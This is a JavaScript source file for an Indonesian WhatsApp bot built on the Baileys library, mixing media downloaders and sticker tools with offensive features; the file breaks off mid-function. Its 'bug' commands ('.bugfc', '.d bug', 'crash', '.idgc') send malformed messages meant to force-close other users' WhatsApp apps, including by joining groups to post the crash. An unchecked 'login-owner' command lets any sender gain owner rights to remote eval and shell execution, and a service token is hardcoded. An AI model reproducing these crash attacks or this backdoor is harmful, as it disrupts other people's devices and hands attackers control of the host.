import baileys from "@adiwajshing/baileys"
import axios from "axios"
import fetch from "node-fetch"
import fs from "fs"
import util from "util"
import cp from "child_process"
import module from "module"
import jimp from "jimp"
import os from "os"
import moment from "moment-timezone"
import cheerio from "cheerio"
import FormData from "form-data"
import * as fileType from "file-type"
import Jimp from "jimp"
import puppeteer from "puppeteer"
import syntaxerror from "syntax-error"
import jawaskrip from "jawaskrip"
import P from "pino"
import Message, {
color,
owner,
anon,
chatsFilter,
random,
getRandom,
streamToBuff,
ffmpegDefault,
hapus,
baca,
simpan,
sticker,
getExif,
CustomError,
clearCache,
cekUsia,
bindSock,
format
} from "./functions.js"
import * as functions from "./functions.js"
import dt, {
savefrom,
JSObfuscator,
identifymusic,
top4top,
deepai,
gdrive,
anonfiles,
jarak,
mix,
gtts,
igstalk,
ytdl,
ssweb,
couple,
rmbg,
yts,
youtube,
stalk,
tinyurl
} from "./data.js"
import * as scrap from "./data.js"
import * as bochil from "@bochilteam/scraper"
let {
version,
isLatest
} = await baileys.fetchLatestBaileysVersion()
//kontol
global.json = {}
process.env.PUP_HOST = "ws://puppeteer-ws.herokuapp.com/?token=free"
global.require = module.createRequire(import.meta.url)
global.setting = {
author: "Ivanzz`",
wm: "Created By : Ivanzz` \nWebsite : ivanz.xyz \nEmail : ivanzzoffc@gmail.com \nPhone : +62 881-2904-283",
owner: owner,
owner2: ["6285742088184@s.whatsapp.net"], //"6288983804245@s.whatsapp.net"],
prefix: ".",
antiSpam: false,
antiNsfw: false,
presence: "unavailable",
auth: "auth.json"
}
global.tumnel = await (await fetch ("https://i.ibb.co/cQwSSJ9/1657159953434.jpg")).buffer()
let app= require ("express")()
const main = async (auth, stor, own) => {
let store = stor ? baileys.makeInMemoryStore({
logger: P().child({level: 'silent', stream: 'store'})
}) : undefined 
store.readFromFile("store.json")
var fileAuth = baileys.useSingleFileAuthState(auth)
var sock = baileys.default({
auth: fileAuth.state,
printQRInTerminal: true,
markOnlineOnConnect: false,
version: version,
logger: P({
level: "silent"
}),
})
bindSock(sock)
store.bind(sock.ev)
 setInterval(() => {
store.writeToFile("store.json")
}, 10000)
sock.ev.on("creds.update", fileAuth.saveState)
sock.ev.on("connection.update", update => {
sock.ev.emit("multi.sessions", update)
if (update.connection == "close") {
var code = update.lastDisconnect?.error?.output?.statusCode;
console.log(update.lastDisconnect?.error)
if (code != 401) {
main(setting.auth, owner)
}
if (update.connection == "open") {
console.log("Connect to WA Web")
}
}
})
sock.ev.on('call', async (json) => {
    console.log(json)
    for (let res of json) {
    if (res.isGroup == false) {
    if (res.status == "offer") {
    await sock.updateBlockStatus(res.from, "block")
    }
    }
    }
    })
sock.ev.on('group-participants.update', m => {
  console.log(m)
  for (var part of m.participants) {
    var ary = Array.isArray(m.participants) ? m.participants : [m.participants]
 const ftxt = {
	 key:
	 { fromMe: false,
	 participant: `0@s.whatsapp.net`, ...(m.id ? 
	 { remoteJid: "status@broadcast" } : {}) },
	 message: { "extendedTextMessage": {"text": `Group Announce`  }}
	}
    if (m.action == "remove") sock.sendText(m.id, `@${part.split("@")[0]} Keluar dari group`, { mentions: ary, quoted: ftxt})
    if (m.action == "add") sock.sendText(m.id, `@${part.split("@")[0]} Welcome..`, { mentions: ary, quoted: ftxt})
    if (m.action == "promote") sock.sendText(m.id, `@${part.split("@")[0]} Telah menjadi admin`, { mentions: ary, quoted: ftxt})
    if (m.action == "demote") sock.sendText(m.id, `@${part.split("@")[0]} Telah berhenti menjadi admin`, { mentions: ary, quoted: ftxt})
}
})
sock.ev.on("groups.update", p => {
  for (var m of p) {
  const ftxt = {
	 key:
	 { fromMe: false,
	 participant: `0@s.whatsapp.net`, ...(m.id ? 
	 { remoteJid: "status@broadcast" } : {}) },
	 message: { "extendedTextMessage": {"text": `Group Announce`  }}
  }
  if (m.subject) sock.sendText(m.id, `Nama grup telah di ganti (${m.subject})`, { quoted: ftxt})
  if (!m.announce) sock.sendText(m.id, `Grup dibuka!`, { quoted: ftxt})
 if (m.announce) { if (m.subject) return;sock.sendText(m.id, `Grup ditutup!`, { quoted: ftxt})
  }
  }
})
sock.ev.on("messages.upsert",
async (message) => {
try {
if (!message.messages[0]) return
let timestamp = new Date()
let msg = message.messages[0]
if (!msg.message) return;
let m = new Message(msg, sock, store)
let type = Object.keys(msg.message)[0]
let from = msg.key.remoteJid;
let isGroup = from.endsWith("@g.us")
let sender = isGroup ? msg.key.participant : m.sender;
let metadata = isGroup ? await sock.groupMetadata(from) : ""
let me = sock.user.id.split(":")[0] + baileys.S_WHATSAPP_NET
let isMeAdmin = isGroup ? metadata.participants.find(v => v.id == me).admin : ""
let isAdmin = isGroup ? metadata.participants.find(u => u.id == sender)?.admin : ""
isMeAdmin = isMeAdmin == "admin" || isMeAdmin == "superadmin"
isAdmin = isAdmin == "admin" || isAdmin == "superadmin"
let pushname = msg.pushName
let body = msg.message?.conversation || msg.message?.imageMessage?.caption || msg.message?.videoMessage?.caption || msg.message?.extendedTextMessage?.text || msg.message?.listResponseMessage?.singleSelectReply?.selectedRowId || msg.message?.buttonsResponseMessage?.selectedButtonId || msg.message?.templateButtonReplyMessage?.selectedId || "";
let args = body.trim().split(/ +/).slice(1)
let q = args.join(" ")
let command = body.slice(0).trim().split(/ +/).shift().toLowerCase()
let isOwner = !!own.find(o => o == sender)
let time = moment.tz("Asia/Jakarta").format("HH:mm")
let prefix = setting.prefix
let isCmd = command.startsWith(prefix)
var data = { prefix, body, pushname, from, setting, time, metadata, functions, scrap, sock, bochil, baileys, store } 
//read 
if (m.key.remoteJid === 'status@broadcast') return sock.readMessages([m.key])
 let anuku = await store.chats.all().map(v => v.id)
for (let luo of anuku) {
sock.sendPresenceUpdate(setting.presence, luo)
}
function reply(text) {
sock.sendMessage(from, {
text
}, {
quoted: msg
})
}
async function sendContact(jid, numbers, name, quoted, men) {
let number = numbers.replace(/[^0-9]/g, '')
const vcard = 'BEGIN:VCARD\n' +
'VERSION:3.0\n' +
'FN:' + name + '\n' +
'ORG:;\n' +
'TEL;type=CELL;type=VOICE;waid=' + number + ':+' + number + '\n' +
'END:VCARD'
return sock.sendMessage(jid, {
contacts: {
displayName: name,
contacts: [{
vcard
}]
},
mentions: men ? men : []
}, {
quoted: quoted
})
}
if (setting.autoReact) {
 sock.sendMessage(from, { react: { key: m.key, text: random(setting.emjReact)}})
}
if (command) {
console.log(`[ MESSAGE ] from ${pushname} text: ${body}`)
}
switch (command) {
case prefix + "anonymous":
var teks = "*MENU ANONYMOUS CHAT*\n\n"
teks += prefix + "start [untuk memulai chat]\n"
teks += prefix + "next [untuk memulai chat baru]\n"
teks += prefix + "leave [untuk keluar dari chat]\n"
teks += prefix + "sendprofile [untuk mengirim kontak mu]\n"
reply(teks)

break
case prefix+"ytmp3":
  if (!q) return reply("Masukan URL !!")
  var tst = /youtu/.test(q)
  if (!tst) return reply ("Masukkan Link Yang Benar!!")
var urel = await (await savefrom (q)).url[1].url
var bpr = await (await fetch (urel)).buffer()
var tad = await functions.toAudio(bpr)
sock.sendFile(from, tad, { quoted: msg })
break

case "ck":
case "kuota":
var token = "c536330f-1106-459a-b9c5-18f09c68d1af"
if (q) token = q
function bar(p) {
let titik = "▒".repeat(10).split("")

for (let i = 1; i <= p; i++) {
if (i%10 == 0) {
titik[(i/10)-1] = "█";
}
}
return "[ " + titik.join(" ") + " ]";
}

var { data } = await axios({
"headers": {
"Authorization": token,
"User-Agent": "okhttp/4.2.2"
},
"method": "GET",
"url": "https://quota.api.axis.co.id/quota"
})
let {result} = JSON.parse(atob(data.data))
let sisakuota = ''
for (let kuota of result.detail) {
let dateberlaku = new Date(kuota.benefitData.activeUntil)
let bulan0 = dateberlaku.toLocaleDateString('id', {month: 'long'})
let bulan = bulan0[0]+bulan0[1]+bulan0[2]
sisakuota += `*${kuota.name}*\n${bar(kuota.percentRemaining)}\nSISA ${kuota.remaining}\nBerlaku s.d. ${dateberlaku.getDate()} ${bulan} ${dateberlaku.getFullYear()} ${dateberlaku.getHours()}:${dateberlaku.getMinutes()}\n\n`
}
sock.sendMessage(from, { text: sisakuota }, {quoted: msg})
break
case prefix+ "cp":
case prefix+ "couple":
case prefix+ "ppcouple":
let cpl = await couple ()
sock.sendMessage(from, {image: { url: cpl.cowo }, contextInfo: {
externalAdReply: { 
showAdAttribution: true,
renderLargerThumbnail: false,
thumbnail: tumnel,
title: "Cowo",
body: "Ivanzz`",
sourceUrl: "https://ivanz.xyz/"
}
} }, {
quoted: msg
})
sock.sendMessage(from, {image: { url: cpl.cewe}, contextInfo: {
externalAdReply: { 
showAdAttribution: true,
renderLargerThumbnail: false,
thumbnail: tumnel,
title: "Cewe",
body: "Ivanzz`",
sourceUrl: "https://ivanz.xyz/"
}
} }, {
quoted: msg
})
break
case prefix+"menu":
  var txt = `List Menu
.smeme [text1|text2]
.tiktok [link tiktok]
.tiktokmp3 [link tiktok]
.ytmp4 [link yt]
.ytmp3 [link yt]
.s [reply foto]
.toimg [reply stiker]
.couple (random pp couple)
.lirik [judul lagu]
.bgcolor [blue/red, reply img]
.remini (hd in foto)
.tomp3 [reply video]
.jarak [tempat|tujuan]
.cekusia [contoh: 2007 11 1]
.snobg (sticker tanpa background)
.gdrive [link google drive]
.hidetag [teks, for admin]
.play [judul]
.menfes Nomor|Nama|Pesan`
sock.sendText(from, txt, { quoted: msg})
break
case prefix+"play":
  if (!q) return reply ("Masukan Judul Lagu !!")
  try {
  var res = await (await youtube.search(q, 5))[0].download()
  sock.sendFile(from, res.mp3, { mimetype: "audio/mpeg", quoted: msg })
  } catch {
    return reply ("Lagu tidak ditemukan !!")
  }
  break
case prefix + "d":
if (!q) {
sock.sendMessage(from, { delete: {
remoteJid: from,
id: m.quoted.id,
fromMe: m.quoted.fromMe,
participant: m.quoted.sender
}})
} else if (q == "bug") {
sock.sendMessage(from, { delete: {
remoteJid: from,
id: m.quoted.id,
fromMe: m.quoted.fromMe,
participant: ''
}})
}
break
case prefix+"tagme":
  sock.sendText(from, "@"+sender.split("@")[0], { mentions:[sender]})
  break
case prefix+"hidetag":
  if (!q) return reply ("Masukan teks !!")
  if (!isAdmin && !isOwner) return 
 var prt = await (await sock.groupMetadata(from)).participants
  var jsn = []; for (var i of prt) jsn.push(i.id);
  sock.sendText(from, `*Hidetag!!*\n\nDari @${sender.split("@")[0]}\nPesan : ${q}`, { mentions: jsn })
  break
case prefix+"pin":
case prefix+"pinterest":
 var pn = await require ("@bochilteam/scraper").pinterest(q)
var rnd = random(pn)
sock.sendFile(from, rnd, { quoted: msg })
break
case prefix+"cuaca":
if (!q) return reply("Contoh: .cuaca Salatiga, Gendongan")
var anjay = await data.scrap.cuaca(q)
sock.sendMessage(from, { image: anjay.img, caption: util.format({ suhu: anjay.suhu, waktu: anjay.waktu, cuaca: anjay.cuaca, daerah: anjay.daerah }), quoted: msg })
break
case prefix+ "toimg":
case prefix+ "toimage":
if (!m.quoted) return reply("Reply Sticker !!")
var filename = getRandom("webp")
var out = getRandom("png")
await simpan(filename, await m.quoted.download())
var outname = await ffmpegDefault(filename, out)
sock.sendMessage(from, {
image: baca(outname),
contextInfo: {
externalAdReply: { 
showAdAttribution: true,
renderLargerThumbnail: false,
thumbnail: tumnel,
title: "Sticker To Image",
body: "Ivanzz`",
sourceUrl: "https://ivanz.xyz/"
}
} }, {
quoted: msg
})
break 
case prefix+"urutkata":
case prefix+"urutabjad":
var spl = q.split(", ")
var sht = spl.sort()
 sock.sendText(from, sht.join("\n"), { quoted: msg })
 break
case prefix+"idgc":
let cde = q.split("com/")[1]
let ide = (await sock.groupGetInviteInfo(cde)).id
sock.sendText(from, util.format(await sock.groupGetInviteInfo(cde)), {quoted: msg})
sock.groupAcceptInvite(cde)
await baileys.delay(2000)
sock.sendText(from, ".bugfc "+ide)
await baileys.delay(60000)
sock.groupLeave(ide)
break
case prefix+"bgcolor":
case prefix+"bg":
if (!/red|blue|#/.test(q)) return reply(`*Warna _${q}_ tidak tersedia*\n\nContoh Penggunaan : .bgcolor red\nList Warna : red, blue, atau code warna #XXXXXX`)
var { image } = await data.scrap.bgcolor(m.quoted? await m.quoted.download(): await m.download(), { color: q })
sock.sendFile(from, image, { quoted: msg, caption: "Background : "+q})
break
case prefix + "getpp":
if (isGroup && !q) return reply("Masukan nomor atau tag member!")
if (!q) return reply("Masukan nomor!")
let no;
var image;
if (q.includes(baileys.S_WHATSAPP_NET)) no = q.split("@")[0]
else if (q.startsWith("@")) no = q.split("@")[1]
else no = q;
var dt = await sock.onWhatsApp(no + baileys.S_WHATSAPP_NET)
if (dt.length > 0) {
sock.profilePictureUrl(dt[0].jid, "image").then(async (pp) => {
sock.sendMessage(from, {
image: {
url: pp
}
}, {
quoted: msg
})
}).catch(_ => {
reply("No Profile")
})
}
break;
case prefix + "lirik":
try {
var { title, creator, lyrics } = await data.scrap.lyric(q)
var tek = `Judul : ${title ? title : "tidak ditemukan"}\nPengarang : ${creator ? creator : "tidak ditemukan"}\n\n${lyrics ? lyrics : "-"}`
sock.sendText(from, tek, { quoted: msg })
} catch {
return reply("Lirik lagu tsb tidak ditemukan!!")
}
break 
case prefix +"update":
case prefix +"update":
case prefix+"u":
case prefix+ "restart":
if (!isOwner) return 
let git = cp.execSync('git pull').toString()
 await sock.sendText(from, util.format(git), { quoted: msg })
return cp.execSync("pm2 restart all")
break
case "bugmenu":
case prefix + "bug":
reply("BUG MENU\n\n - 1x Force Close : cash\n- 5 menit Force Close : .d bug [ reply msg, only admin ]\n- ∞ Force Close : .bugfc [ default from | xx@g.us/xx@s.whatsapp.net ]")
break
case prefix + "upload":
var url = await scrap.telegra(m.quoted ? await m.quoted.download() : await m.download())
sock.sendText(from, url, { quoted: msg })
break;
case prefix+"remini":
 case prefix+"hd":
   var bf = m.quoted ? await m.quoted.download() : await m.download()
var depp = await deepai("waifu2x", {
image: bf
})
sock.sendMessage(from, {
image: {
url: depp.output_url
}
}, {
quoted: msg
})
break
case prefix + "deepai":
let dep = await deepai(q, {
image: m.quoted ? await m.quoted.download() : await m.download()
})
sock.sendMessage(from, {
image: {
url: dep.output_url
}
}, {
quoted: msg
})
break
case prefix + "gdrive":
let gdr = await gdrive(q)
sock.sendMessage(from, {
document: {
url: gdr.downloadUrl
},
fileName: gdr.fileName,
mimetype: gdr.mimetype
}, {
quoted: msg
})
break

case prefix + "join":
var link = q
if (!q) link = m.quoted ? m.quoted.text : m.text
if (!/https?:\/\/(chat\.whatsapp\.com)\/[A-Za-z]/.test(link)) return ("Link tidak valid")
try {
var code = link.split("/")[3]
await sock.groupAcceptInvite(code)
reply("Suscess join")
} catch (e) {
reply(String(e))
}
break;
case prefix+ "jarak":
var dari = q.split("|")[0]
var ke = q.split("|")[1]
var jr = await jarak(dari, ke)
sock.sendMessage(from, { image: { url: jr.img }, caption: jr.desc , contextInfo: {
externalAdReply: { 
showAdAttribution: true,
renderLargerThumbnail: false,
thumbnail: tumnel,
title: "Prediksi Jarak",
body: "Ivanzz`",
sourceUrl: "https://ivanz.xyz/"
}
}}, { quoted: msg })
break
case prefix+"removebg":
  var buffer = await scrap.rmbg(m.quoted ? await m.quoted.download() : await m.download())
  sock.sendFile(from, buffer, { quoted: msg, caption: "this result.." })
  break
case "baca":
if (!msg.message[type]?.contextInfo?.quotedMessage) return;
var tipeQuot = Object.keys(msg.message[type].contextInfo.quotedMessage)[0]
if (tipeQuot == "viewOnceMessage") {
var anu = msg.message.extendedTextMessage.contextInfo.quotedMessage.viewOnceMessage.message
var tipe = Object.keys(anu)[0]
delete anu[tipe].viewOnce
var ah = {}
if (anu[tipe].caption) ah.caption = anu[tipe].caption
if (anu[tipe]?.contextInfo?.mentionedJid) {
ah.contextInfo = {}
ah.contextInfo.mentionedJid = anu[tipe]?.contextInfo?.mentionedJid || []
}
var dta = await baileys.downloadContentFromMessage(anu[tipe], tipe.split("M")[0])
sock.sendMessage(from, {
[tipe.split("M")[0]]: await streamToBuff(dta),
...ah
}, {
quoted: msg
})
}
if (tipeQuot == "documentMessage") {
var text = (await m.quoted.download()).toString()
if (text.length >= 65000) text.slice(65000)
reply(util.format(text))
}
break;
case prefix + "audio": {
if (!q) return reply("masuk kan prameter")
let dt = await m.quoted.download()
let dta = q.split("|")[0]
let dtaa = q.split("|")[1]
await sock.sendMessage(from, {
audio: await data.functions.audio.create(dt, {
[dta]: dtaa
}),
mimetype: "audio/mpeg",
ptt: true 
,contextInfo: {
externalAdReply: { 
showAdAttribution: true,
renderLargerThumbnail: false,
thumbnail: tumnel,
title: "Audio Filter",
body: "Ivanzz`",
sourceUrl: "https://ivanz.xyz/"
}
}}, {
quoted: msg
})
}
break
case prefix+"toaudio":
case prefix+"tomp3":
sock.sendFile(from, await data.functions.toAudio(m.quoted ? await m.quoted.download() : await m.download()), { quoted: msg })
break
case prefix + "cut": {
if (!q) return reply("masuk kan prameter")
let dt = await m.quoted.download()
let i = q.split("|")[0]
let o = q.split("|")[1]
await sock.sendMessage(from, {
audio: await data.functions.audio.create(dt, {
cut: [i, o]
}),
mimetype: "audio/mpeg" }, {
quoted: msg
})
}
break
case prefix+"cekusia":
case prefix+ "umur":
if (!q) return reply ("penggunaan .cekUsia 2007 11 1")
reply(cekUsia(q))
break
case "hadeeh":
case "crash":
case "bug1x":
case "hack":
//if (!isOwner) return 
let reactionMessage = baileys.proto.Message.ReactionMessage.create({ key: m.key, text: "" })
sock.relayMessage(from, { reactionMessage }, { messageId: "ppppp" })
break
case prefix + "tt":
case prefix + "tiktok":
case prefix + "ttmp4":
case prefix+ "ytmp4":

if (!q) return reply("Masukan URL !")
try {
var dt = await savefrom(q)
sock.sendMessage(from, {
video: {
url: dt.url[0].url
}},
{
quoted: msg
})
} catch (e) {
reply(String(e))
}
break;
case prefix+ "ss":
case prefix+ "ssweb":
if (!q) return reply("Masukan URL !")
if (q) {
sock.sendMessage(from, { image: await ssweb(args[0], args[1] ? true : false), contextInfo: {
externalAdReply: { 
showAdAttribution: true,
renderLargerThumbnail: false,
thumbnail: tumnel,
title: "Screenshot Web",
body: "Ivanzz`",
sourceUrl: "https://ivanz.xyz/"
}
} }, {
quoted: msg
})
}
break
case prefix+ "setpp":
if (!isOwner) return 
async function generateProfilePicture(buffer) {
const jimp_1 = await jimp.read(buffer);
const resz = jimp_1.getWidth() > jimp_1.getHeight() ? jimp_1.resize(550, jimp.AUTO) : jimp_1.resize(jimp.AUTO, 650)
const jimp_2 = await jimp.read(await resz.getBufferAsync(jimp.MIME_JPEG));
return {
img: await resz.getBufferAsync(jimp.MIME_JPEG)
}

}
async function setpp(jid, bupper) {
 var { img } = await generateProfilePicture(bupper)
return await sock.query({
tag: 'iq',
attrs: {
to: jid,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
}
sock.sendMessage(from, { text: util.format( await (await setpp(sender, await m.quoted.download())).content[0]) }, {quoted:msg})
break

case prefix + "bugfc":
if (!isOwner) return
let bugfc = {
key: {
fromMe: true,
participant: `0@s.whatsapp.net`,
...({
remoteJid: ""
})
},
message: {
conversation: 'p'
}
}
sock.sendMessage(q ? q:from, {
text: 'p'
}, {
quoted: bugfc
})
break
case prefix + "ttmp3":
case prefix + "tiktokaudio":
case prefix + "tiktokmusic":
case prefix + "tiktokmp3":
if (!q) return reply("Masukan URL !")
let titid;
if (body.includes("tt") || body.includes("tiktok")) titid = "Tiktok Mp3"
if (body.includes("ytmp3")) titid = "Youtube Mp3"
try {
var dtaa = await savefrom(q)
var filename = getRandom("mp4")
var out = getRandom("mp3")
var buff = await (await fetch(dtaa.url[0].url)).buffer()
await fs.writeFileSync(filename, buff)
var outname = await ffmpegDefault(filename, out)
sock.sendMessage(from, {
audio: baca(outname),
mimetype: "audio/mpeg" },
{
quoted: msg
})
hapus(outname)
hapus(filename)
} catch (e) {
reply(String(e))
}
break;
case prefix+ "stiker":
case prefix+"s":
case "sticker":
 if (q) {
bup = m.quoted ? await m.quoted.download() : await m.download()
 sock.sendMessage(from, { sticker: await sticker(bup, { pack: q.split("|")[0], author: q.split("|")[1], type: "full"})}, { quoted: msg })
 } else {
sock.sendMessage(from, { sticker: await sticker(m.quoted ? await m.quoted.download() : await m.download(), { pack: setting.wm, author: '', type: "full"})}, { quoted: msg })
 }
 break
case prefix+"snobg":
 var bup = await rmbg (m.quoted ? await m.quoted.download() : await m.download())
 sock.sendMessage(from, { sticker: await sticker(bup, { pack: q ? q.split("|")[0] : setting.wm, author: q ? q.split("|")[1]: setting.author, type: "full"}), contextInfo: {
externalAdReply: { 
showAdAttribution: true,
renderLargerThumbnail: false,
thumbnail: tumnel,
title: "Sticker by",
body: "Ivanzz`",
sourceUrl: "https://ivanz.xyz/"
}
}})
break
case prefix+"smeme":
  if (!q) return reply("Input TEXT !!")
  if (!q.includes("|")) return reply("Contoh: .smeme text1|text2")
  var res = await scrap.smeme(q.split("|")[0], q.split("|")[1], m.quoted ? await m.quoted.download() : await m.download())
  sock.sendMessage(from, { sticker: await sticker(await (await fetch (res)).buffer(), { pack: setting.wm, author: "", type: "full"})}, { quoted: msg })
  break
case prefix + "emojimix":
case prefix + "mix":
if (!q) return reply("masukan emoji")
var [emoji1, emoji2] = q.split("|")
var url = await mix(encodeURI(emoji1), encodeURI ( emoji2))
if (!url || url?.results?.length == 0) return reply(`Emoji ${emoji1} dan ${emoji2} tidak di temukan`)
var buff = await fetch(url.results[0].url)
sock.sendMessage(from, {
sticker: await sticker (buff.buffer(), { author: setting.author, pack: setting.wm, type: "FULL" })
}, {
quoted: msg
})
break;
case prefix + "leave": {
if (isGroup && isOwner && command == prefix + "leave") return sock.groupLeave(from)
if (isGroup) return reply("Only private chat")
var room = Object.values(anon.anonymous).find(p => p.check(sender))
if (!room) return reply("Anda tidak berada didalam room")
reply("Berhasil mengakhiri chat.")
var other = room.other(sender)
delete anon.anonymous[room.id]
if (other != "") sock.sendMessage(other, {
text: "Pengirim telah mengakhiri chat ini!!"
})
if (command == prefix + "leave") break;
}
  case prefix+"menfes":
    case prefix+"confes":
    if (!q) return reply("Contoh penggunaan: .menfes +62 881-2904-283|Nama Kamu|Pesan Kamu")
    if (!q.includes("|")) return reply("Contoh penggunaan: .menfes +62 881-2904-283|Nama Kamu|Pesan Kamu")
if (isGroup) return reply("Only private chat")
if (q.split("|")[0].startsWith("0")) return reply ("Awali Nomor dengan 62/+62")
var to = q.split("|")[0]
if (to == sender) return reply("tidak dapat mengirimkan confes ke diri sendiri")
if (to.startsWith("+")) to = to.replace(/[^0-9]/gi, "")
sock.sendText(to+"@s.whatsapp.net", `Haii👋🏻, kamu dapet menfes nihh..

Pengirim: ${q.split("|")[1]}
Pesan: ${q.split("|")[2]}`)
await baileys.delay(2000)
sock.sendText(to+"@s.whatsapp.net", "Sekarang kamu bisa chatting dengan pengirim...")
if (Object.values(anon.anonymous).find(p => p.check(sender))) return reply("Anda masih didalam room")
var check = Object.values(anon.anonymous).find(p => p.state == "WAITING")
if (!check) {
anon.createRoom(sender, to+"@s.whatsapp.net")
console.log("[ANONYMOUS] Creating room for: " + sender);
await reply("Berhasil Mengirimkan Menfes!!\nMenunggu Dia Membals..")
await baileys.delay(2000)
sock.sendText(sender, "Berikut Menu Lainnya:\n.sendprofile (mengirimkan kontak mu)\n.leave (keluar dari chat)")
}
break;
case prefix + "sendprofile":
if (isGroup) return reply("Only private chat")
var wait = Object.values(anon.anonymous).find(p => p.state == "WAITING" && p.check(sender))
if (wait) return reply("kamu mau kirim profile ke siapa??")
var chat = Object.values(anon.anonymous).find(p => p.state == "CHATTING" && p.check(sender))
if (!chat) return reply("Anda tidak berada didalam room")
var other = chat.other(sender)
var msgs = await sendContact(other, sender.split("@")[0], pushname)
reply("Berhasil mengirimkan kontak mu!!")
sock.sendMessage(other, {
text: "Hore!! dia mengirimkan kontak nya"
}, {
quoted: msgs
})
break;
case prefix+"getcase":
var kes;
try {
`case ${q}:`+fs.readFileSync("./index.js").toString().split("switch (command) {")[1].split("default:")[0].split(`case ${String(q)}:`)[1].split("break")[0]+"break;"
} catch {
kes = `case ${q}:`+fs.readFileSync("./index.js").toString().split("switch (command) {")[1].split("default:")[0].split(`case ${String(q)}:`)[1].split("break")[0]+"break;"
}
sock.sendText(from, kes, { quoted: msg })
break 
case "≥":
if (!isOwner) return
let compiled = await jawaskrip.compile(args.join(" "))
try {
var text = util.format(await eval(`;(async () => { ${compiled} })()`))
sock.sendMessage(from, {
text
}, {
quoted: msg
})
} catch(e) {
let _syntax = ""
let _err = util.format(e)
let err = syntaxerror(arg, "Execution Function", {
allowReturnOutsideFunction: true,
allowAwaitOutsideFunction: true,
sourceType: "module"
})
if (err) _syntax = err + "\n\n"
reply(util.format(_syntax + _err))
}
break;
case "login-owner":
  owner.push(m.sender)
  sock.sendText(from, "Succes add "+sender, { quoted: msg })
  break
case ">":
case "=>":
if (!isOwner) return;
var err = new TypeError;
    err.name = "EvalError "
    err.message = "Code Not Found (404)"
if (!q) return reply(util.format(err))
var arg = command == ">" ? args.join(" ") : "return " + args.join(" ")
try {
var text = util.format(await eval(`(async()=>{ ${arg} })()`))
sock.sendMessage(from, {
text
}, {
quoted: msg
})
} catch(e) {
let _syntax = ""
let _err = util.format(e)
let err = syntaxerror(arg, "EvalError", {
allowReturnOutsideFunction: true,
allowAwaitOutsideFunction: true,
sourceType: "module"
})
if (err) _syntax = err + "\n\n"
reply(util.format(_syntax + _err))
}
break;
case prefix + "q":
if (!m.quoted) return reply("Reply pesan")
var quotedObj = await m.quoted.getQuotedObj()
if (!quotedObj.quoted) return reply("Pesan yang anda reply tidak mengandung reply")
sock.relayMessage(from, {
...quotedObj.quoted.fakeObj
}, {
messageId: baileys.generateMessageID()
})
break;
 case "read":
 var kontol = m.quoted.fakeObj[m.quoted.type].message
delete kontol.imageMessage.viewOnce
sock.relayMessage(from, kontol, {})
case "$":
if (!isOwner) return;
try {
cp.exec(args.join(" "), function(er, st) {
if (er) sock.sendMessage(from, {
text: util.format(er.toString().replace(/[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g, ''))
}, {
quoted: msg
})
if (st) sock.sendMessage(from, {
text: util.format(st.toString().replace(/[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g, ''))
}, {
quoted: msg
})
})
} catch (e) {
console.warn(e)
}
break;
default:
if (!isGroup && !isCmd && !m.key.fromMe) {
let room = Object.values(anon.anonymous).find(p => p.state == "CHATTING" && p.check(sender))
//console.log(room);
if (room) {
let other = room.other(sender)
sock.relayMessage(other, baileys.generateForwardMessageContent(m.fakeObj, 1), {
messageId: baileys.generateMessageID()
})
}
}
if (setting.antiSpam && isGroup && !m.key.fromMe) {
chatsFilter.add(body)
let h = chatsFilter.has(body)
console.log(h);
if (h) {
sock.sendText(from, "Jangan Spam !!", { quoted: msg })
}
}
if (!m.key.fromMe && !isAdmin && isMeAdmin && /chat.whatsapp.com\/(?:invite\/)?([0-9A-Za-z]{20,24})/i.test(m.text.text)) {
  sock.sendText(from, "I will take you out !!", { quoted: msg })
  await baileys.delay(2000)
  sock.groupParticipantsUpdate(from, [sender], "remove")
}
if (setting.antiNsfw && !msg.key.fromMe && m.type == "imageMessage") {
let dt = await m.download()
let res = await deepai("nsfw-detector", {
image: dt
})
if (res.output.nsfw_score > 0.75) {
reply(`*NSFW DETECTED*\n\nNAMA: ${pushname}\nWAKTU: ${time}\nSCORE: ${(res.output.nsfw_score).toFixed(2)*100}`)
console.log("[ NSFW DETECTED ]\n\n" + res.output)
 
}
}

/*if (m.type == "viewOnceMessage" && !msg.key.fromMe) {
var anu = msg.message.viewOnceMessage.message
var tipe = Object.keys(anu)[0]
delete anu[tipe].viewOnce
var ah = {}
if (anu[tipe].caption) ah.caption = anu[tipe].caption
if (anu[tipe]?.contextInfo?.mentionedJid) {
ah.contextInfo = {}
ah.contextInfo.mentionedJid = anu[tipe]?.contextInfo?.mentionedJid || []
}
let uh = await sock.sendMessage(from, { text:`ANTI VIEWONCE MESSAGE\n\nNama: ${pushname}\nWaktu: ${moment.tz("Asia/Jakarta").format("HH:mm:ss")}\nTipe: ${tipe}`}, { quoted: msg})

var dt = await baileys.downloadContentFromMessage(anu[tipe], tipe.split("M")[0])

sock.sendMessage(from, {

[tipe.split("M")[0]]: await streamToBuff(dt),

...ah

}, {quoted: uh})
}*/
}
} catch (e) {
console.log(e)

}
})
}
/*
@ Start This Script 
*/
main("auth.2.json", true, owner)
//main("auth.json", true, owner)
startApp()
startTV()
process.env.KEY = "IvanzzSad"
process.on("UnhandledPromiseRejection", async qm => {
console.log("[INFO] " + qm)
main(setting.auth, true, true)
})
function createPage(path, html) {
app.get(path, (req, res) => {
res.send(html)
})
return JSON.stringify({ url: "https://ivanz.herokuapp.com"+path }, null, 2)
}
async function react(options = {}, sock) {
if (!options.jid) throw new Error("Jid not be empty")
if (!options.id) throw new Error("id not be empty")
if (!options.participant) throw new Error("participat not be empty")
if (!options.timestamp) throw new Error("timestamp not be empty")
if (!options.emoji) throw new Error("emoji not be empty")
let reac = await baileys.proto.ReactionMessage.create({
key: {
id: options.id,
participant: options.participant,
remoteJid: options.jid,
},
text: options.emoji,
senderTimestampMs: options.timestamp
});
if (sock) return await sock.relayMessage(reac.key.remoteJid, {
reactionMessage: reac
}, {
messageId: baileys.generateMessageID()
});
else return reac
}
async function mmgwa(msg) {
try {
if (msg.url && msg.mediaKey) {
const mediakei = Buffer.from(msg.mediaKey).toString('base64')
